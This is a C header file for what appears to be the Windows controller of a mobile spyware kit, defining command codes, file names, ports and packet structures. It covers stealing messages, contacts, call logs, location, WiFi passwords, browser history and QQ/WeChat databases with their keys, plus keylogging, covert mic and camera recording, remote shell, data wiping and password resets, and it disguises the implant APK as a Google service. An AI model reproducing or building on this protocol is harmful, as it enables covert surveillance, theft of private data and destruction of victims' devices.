
#pragma once
#include <windows.h>
#include "zconf.h"
#include "zlib.h"

#pragma comment(lib,"lib/zlib.lib")


//#define NEED_LOGIN_WINDOW 

#define ANDROID_ICON  0x1100



#define UPLOADFILECOMMANDFILE		"uploadfilecommand.txt"
#define DOWNLOADFILECOMMANDFILE		"downloadfilecommand.txt"
#define AUTOINSTALLAPKCOMMANDFILE	"autoinstallapkfilecommand.txt"
#define SHELLCOMMANDFILE			"shellcommand.txt"
#define SENDMESSAGEFILE				"sendmessagecommand.txt"
#define CALLPHONEFILE				"callphonecommand.txt"
#define WIPESTORAGEFILE				"wipestoragecommand.txt"
#define WIPESYSTEMFILE				"wipesystemcommand.txt"
#define RESETSYSTEMFILE				"resetsystemcommand.txt"
#define RESETPASSWORDFILE			"resetpasswordcommand.txt"
#define CAMERAPHOTOCOMMANDFILE		"cameraphotocommand.txt"
#define MICAUDIOCOMMANDFILE			"micaudiocommand.txt"
#define UNINSTALLCOMMANDFILE		"uninstallcommand.txt"
#define UPLOADQQWXDBCOMMANDFILE		"uploadqqwxdb.txt"


#define MESSAGECOMMANDFILE			"message.txt"
#define CONTACTCOMMANDFILE			"contacts.txt"
#define DCIMCOMMANDFILE				"dcim.txt"
#define CALLLOGCOMMANDFILE			"calllog.txt"
#define DEVICEINFOCOMMANDFILE		"deviceinfo.txt"
//#define APPLISTCOMMANDFILE			"applistcommand.txt"
#define APPLISTCOMMANDFILE			"applist.txt"
#define SDCARDCOMMANDFILE			"sdcardfiles.txt"
#define PHONEWIFICOMMANDFILE		"wifi.txt"
//#define RUNNINGAPPSCOMMANDFILE		"runningappscommand.txt"
#define RUNNINGAPPSCOMMANDFILE		"running.txt"
#define FILERECORDCOMMANDFILE		"filerecordcommand.txt"
#define CONFIGCOMMANDFILE			"configcommand.txt"


#define EXTSDCARDCOMMANDFILE		"extsdcardcommand.txt"
#define FLASHCARDCOMMANDFILE		"flashcardcommand.txt"
#define APPMESSAGECOMMANDFILE		"appmessagecommand.txt"
#define SINGLELOCATIONCOMMANDFILE	"singlelocationcommand.txt"
#define SINGLESCREENCOMMANDFILE		"singlescreencommand.txt"
#define CANCELLOCATIONCOMMANDFILE	"cancellocationcommand.txt"
#define CANCELSCREENCOMMANDFILE		"cancelscreencommand.txt"

#define WEBKITBROWSERCOMMANDFILE	"webkitbrowsercommand.txt"
#define CHROMEBROWSERCOMMANDFILE	"chromebrowsercommand.txt"
#define FIREFOXROWSERCOMMANDFILE	"firefoxbrowsercommand.txt"
#define LOCATIONCOMMANDFILE			"locationcommand.txt"
#define SCRNSNAPSHOTOMMANDFILE		"scrnsnapshotcommand.txt"

#define UPDATEPLUGINCOMMANDFILE		"updatecommand.txt"
#define RESETPROGRAMCOMMANDFILE		"resetprogramcommand.txt"
#define SHUTDOWNCOMMANDFILE			"shutdowncommand.txt"
#define MESSAGEBOXCOMMANDFILE		"messageboxcommand.txt"

#define SCREENVIDEOCOMMANDFILE		"screenvideocommand.txt"
#define CLIPBOARDCOMMANDFILE		"clipboardcommand.txt"
#define KEYBOARDCOMMANDFILE			"keyboardcommand.txt"
#define CAMERAVIDEOCOMMANDFILE		"cameravideocommand.txt"
#define INJECTSOCOMMANDFILE			"injectsocommand.txt"
#define REMOTE_CONTROLCOMMANDFILE   "remotecontrolcommand.txt"
#define CHANGEIPCOMMANDFILE			"changeipcommand.txt"



#define IP_CONFIG_FILE				"ip.txt"
#define CONFIG_FILENAME				"config.json"
//#define ADMINISTRATOR_NAME			"admin"
#define DOWNLOAD_FILE_DIR_NAME		"download"
#define UPLOAD_FILE_DIR_NAME		"upload"
#define COMMAND_DIR_NAME			"command"
#define CLIENT_ONLINE_FILE_NAME		"client_online.txt"
#define THREAD_INFO_FILE_NAME		"thread_info.txt"	
#define ERROR_PACKET_FILENAME		"errorPacket.dat"
#define LOG_FILENAME				"log.txt"

#define TMP_FILE_SURFIX				".tmp"
#define MESSAGE_FILENAME			"message.json"
#define CALLLOG_FILENAME			"calllog.json"
#define CONTACTS_FILENAME			"contacts.json"
#define DEVICEINFO_FILENAME			"deviceinfo.json"
#define LOCATION_FILENAME			"location.json"
#define SDCARDFILES_FILENAME		"sdcardfiles.json"
#define EXTCARDFILES_FILENAME		"extcardfiles.txt"
#define APPPROCESS_FILENAME			"applist.json"
#define RUNNINGAPPS_FILENAME		"running.json"
#define WIFI_FILENAME				"wifi.json"
#define RUNNING_LOG_FILENAME		"iosLog.txt"
#define QQACCOUNT_FILENAME			"qqaccount.json"
//#define QQMESSAGE_FILENAME			"qqmessage.txt"
//#define WHATSAPPMESSAGE_FILENAME	"whatsappmessage.txt"
//#define QQMESSAGE_FILENAME			"weixin.txt"
//#define QQMESSAGE_FILENAME			"telegram.txt"
//#define QQMESSAGE_FILENAME			"skype.txt"
#define WEBKITHISTORY_FILENAME		"webkithistroy.json"
#define CHROMEHISTORY_FILE_NAME		"chromehistory.json"
#define FIREFOXRECORD_FILE_NAME 	"firefoxhistory.json"

#define FILERECORD_FILE_NAME		"filerecord.txt"
#define UNINSTALL_FILENAME			"uninstall.txt"
#define GESTURE_FILENAME			"gesture.json"
#define WIFIPASS_FILENAME			"wifipassword.json"
#define QQDATABASE_FILENAME			"qqdb"	
#define WEXINDATABASE_FILENAME		"wxdb"
#define WEXINUSERINFO_FILENAME		"wxuser.txt"
#define WEIXINDBKEY_FILENAME		"wxdbkey.txt"
#define FLASHCARDFILES_FILENAME		"flashcardfiles.txt"
#define WEIXINUSERINFO_FILENAME		"weixin_user_info.txt"


//#define MICAUDIORECORD_FILENAME		"micaudio.mp4"
//#define BACKGROUD_PICTURE_FILENAME	"BackgroundPicture.jpg"
//#define BACKGROUD_MUSIC_FILENAME		"BackgroundMusic.mp3"
//#define LOGIN_FILENAME				"login.html"
//#define SYSTEM_FILENAME				"system.html"
#define APK_FILENAME				"googlegms.apk"
#define QRCODE_FILENAME				"qrcode.png"
#define APK_BASIC_FILENAME			"GoogleService.apk"
#define APK_ICO_FILENAME			"android_apk.ico"


#define MAX_LISTEN_COUNT 16
#define CRYPT_KEY_SIZE						16
#define USER_NAME_SIZE						16
#define IOS_IDENTIFIER_SIZE					40
#define ERRORPACKETSIZE						128
#define LOCAL_HOST_IP						"127.0.0.1"
#define MAX_SOCKET_LISTEN_COUNT				16
//#define SERVER_DOWNLOADAPK_PORT				80
#define SERVER_DOWNLOADAPK_BACKPORT			10021
#define SERVER_QRCODE_PORT					10022
#define SERVER_DATA_PORT					10023
#define SERVER_CMD_PORT						10024
#define NOTIFY_CMD_PORT						9573
#define MAX_MIC_AUDIO_TIME					3600

#define LIMIT_DATA_SIZE						0x10000000
#define NETWORK_DATABUF_SIZE				0x4000

#define MAX_COMMADN_PARAM_SIZE				0x1000
#define MAX_MESSAGE_SIZE					4096

#define PACKET_CRYPT_FLAG					1
#define PACKET_COMPRESS_FLAG				2
#define PACKET_PLAIN_FLAG					0
#define CLIENT_NETWORK_TYPE_WIFI			8
#define CLIENT_NETWORK_TYPE_WIRELESS		4
#define PACKET_NEWCRYPT_FLAG				17

#define NETWORKERROR						-1

#define THREAD_COMMAND						2
#define THREAD_DATA							1

#define DATASOCK_TIME_OUT_VALUE				60000
#define	CMDSOCK_TIME_OUT_VALUE				180000

#define CLIENT_COMMAND_TIME_INTERVAL		12
#define HEARTBEAT_TIME_DELAY				120000
#define COMMAND_TIME_DELAY					1000





#define CMD_RECV_DATA_OK			1
#define CMD_RECV_CMD_OK				2
#define CMD_DATA_MESSAGE			3
#define CMD_DATA_CONTACTS			4
#define CMD_DATA_DEVICEINFO			5
#define CMD_DATA_CALLLOG			6
#define CMD_DATA_LOCATION			7
#define CMD_DATA_DCIM				8
#define CMD_DATA_SDCARDFILES		9
#define CMD_DATA_EXTCARDFILES 		10
#define CMD_DATA_WIFIPASS 			11
#define CMD_DATA_GESTURE 			12
#define CMD_DATA_CAMERAPHOTO		13
#define CMD_UPLOADFILE				14
#define CMD_DOWNLOADFILE			15
#define CMD_RUNCOMMAND				16
#define CMD_HEARTBEAT				17
#define CMD_PHONECALL				18
#define CMD_SENDMESSAGE				19
#define CMD_DATA_SCRNSNAPSHOT		20
#define CMD_DATA_PHONECALLAUDIO		21
#define CMD_DATA_AUDIO 				22
#define CMD_DATA_VIDEO 				23
#define CMD_AUTOINSTALL 			24
#define CMD_DATA_APPPROCESS			25
#define CMD_DATA_WIFI				26
#define CMD_UPLOAD_LOG				27
#define CMD_WIPESYSTEM				28
#define CMD_RESETSYSTEM				29
#define CMD_RESETPASSWORD			30
#define CMD_DATA_QQACCOUNT			31
#define CMD_DATA_APPMESSAGE			32
#define CMD_DATA_WEBKITHISTORY		33
#define CMD_DATA_LATESTMESSAGE		34
#define CMD_DATA_RUNNINGAPPS		35
#define CMD_DATA_CHROMEHISTORY 		36
#define CMD_DATA_FIREFOXHISTORY		37
#define CMD_DATA_DOWNLOAD			38
#define CMD_DATA_OFFICE				39
#define CMD_DATA_QQFILE				40
#define CMD_DATA_QQAUDIO			41
#define CMD_DATA_QQPROFILE			42
#define CMD_DATA_QQPHOTO			43
#define CMD_DATA_QQVIDEO			44
#define CMD_DATA_FILERECORD			45

#define CMD_UNINSTALL				46
#define CMD_WIPESTORAGE				47
#define CMD_QQDATABASEFILE			48
#define CMD_WEIXINDATABASEFILE		49
#define CMD_WEIXINUSERINFO			50
#define CMD_WEIXINDB_KEY			51
#define CMD_DATA_NEWCALLLOG			52
#define CMD_DATA_WEIXINAUDIO		53
#define CMD_DATA_WEIXINPHOTO		54
#define CMD_DATA_WEIXINVIDEO		55
#define CMD_DATA_MICAUDIORECORD		56
#define CMD_MICAUDIORECORD			57
#define CMD_UNINSTALLSELF			58
#define CMD_GETCONFIG				59
#define CMD_SETCONFIG				60
#define CMD_DATA_FLASHCARDFILES		61
#define CMD_UPDATEPROC				62
#define CMD_RESETPROGRAM			63
#define CMD_SHUTDOWNSYSTEM			64
#define CMD_MESSAGEBOX				65
#define CMD_SINGLELOCATION			66
#define CMD_SINGLESCREENCAP			67
#define CMD_CANCELLOCATION			68
#define CMD_CANCELSCREENCAP 		69

#define  CMD_NETWORKTYPE			70
#define  CMD_UPLOADQQDB				71
#define  CMD_UPLOADWEIXINDB			72
#define  CMD_UPLOADDB				73
#define  CMD_UPLOADWEIXININFO		74
#define	 CMD_CHANGEIP				75

#define  CMD_IOSVOID_TOKEN			98

#define SUPER_CMD_STOP				99
#define COMMAND_VALUE_LIMIT			100

#define SUPER_USERNAME				"19820521"
#define SUPER_IMEI					"1234567890ABCDE"

#define FILE_TRANSFER_TOO_BIG		0X1FFFFFFF
#define FILE_TRANSFER_NOT_FOUND		0X2FFFFFFF
#define RECV_DATA_OK				0X3FFFFFFF




//extern DWORD SERVER_IP_ADDRESS;


#pragma pack(1)

typedef struct{
	SOCKET sockclient;
	SOCKADDR_IN si;
	char currentpath[MAX_PATH];
	DWORD threadid;
}DATAPROCESS_PARAM,*LPDATAPROCESS_PARAM;


typedef struct{
	DWORD dwsize;
	DWORD dwcmd;
	int reservedname;
	char iphoneID[IOS_IDENTIFIER_SIZE];
	char username[USER_NAME_SIZE];
}COMMUNICATION_PACKET_HEADER,*LPCOMMUNICATION_PACKET_HEADER;


typedef struct{
	DWORD dwsize;
	DWORD dwcmd;
	char iphoneID[IOS_IDENTIFIER_SIZE];
}COMMUNICATION_PACKET_HEADER_CMD,*LPCOMMUNICATION_PACKET_HEADER_CMD;


typedef struct{
	WORD type;
	DWORD len;
	char szparam[MAX_PATH];
}CMDNOTIFY,*LPCMDNOTIFY;

typedef struct
{
	SOCKET hSock;
	sockaddr_in stAddr;
	int networktype;
	time_t tmLastOnlineTime;
	DWORD dwType;
	DWORD dwThreadID;
	char iphoneID[IOS_IDENTIFIER_SIZE];
	char ClientName[USER_NAME_SIZE];
}ONLINEINFO,*LPONLINEINFO;


#pragma pack()


